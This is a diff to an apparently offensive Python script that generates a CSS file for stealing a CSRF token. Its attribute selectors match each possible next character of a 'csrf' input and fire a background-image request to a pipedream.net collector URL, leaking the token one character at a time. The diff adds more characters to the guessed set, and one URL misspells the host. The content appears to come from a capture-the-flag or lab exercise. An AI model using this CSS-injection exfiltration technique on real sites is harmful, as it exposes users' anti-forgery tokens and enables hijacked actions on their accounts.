@@ -8,7 +8,7 @@ def build_css(chars):
 
         # création du new file
         file = open("./a.css", "w") 
-        file.write('''input[name="csrf"][value^="'''+chars+'''A"]{background-image: url(https://eomtg1jcz48suc3.m.pipedram.net/'''+chars+'''A); } 
+        str = '''input[name="csrf"][value^="'''+chars+'''A"]{background-image: url(https://eomtg1jcz48suc3.m.pipedram.net/'''+chars+'''A); } 
         input[name="csrf"][value^="'''+chars+'''B"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/'''+chars+'''B);} 
         input[name="csrf"][value^="'''+chars+'''C"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/'''+chars+'''C);} 
         input[name="csrf"][value^="'''+chars+'''D"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/'''+chars+'''D);} 
@@ -70,8 +70,14 @@ def build_css(chars):
         input[name="csrf"][value^="'''+chars+'''7"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/'''+chars+'''7);} 
         input[name="csrf"][value^="'''+chars+'''8"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/'''+chars+'''8);} 
         input[name="csrf"][value^="'''+chars+'''9"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/'''+chars+'''9);}
-        input[name="csrf"][value^="'''+chars+'''_"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/'''+chars+'''_);} 
-            ''') 
+        input[name="csrf"][value^="'''+chars+'''_"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/'''+chars+'''_);}'''
+
+        str2 = '''input[name="csrf"][value^="'''+chars+'''!"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/'''+chars+'''!);}
+        input[name="csrf"][value^="'''+chars+'''?"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/'''+chars+'''?);}
+        input[name="csrf"][value^="'''+chars+'''*"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/'''+chars+'''*);}
+        input[name="csrf"][value^="'''+chars+'''$"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/'''+chars+'''$);}
+        input[name="csrf"][value^="'''+chars+'''&"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/'''+chars+'''&);}'''
+        file.write(str+str2) 
         file.close()
 
 # ----
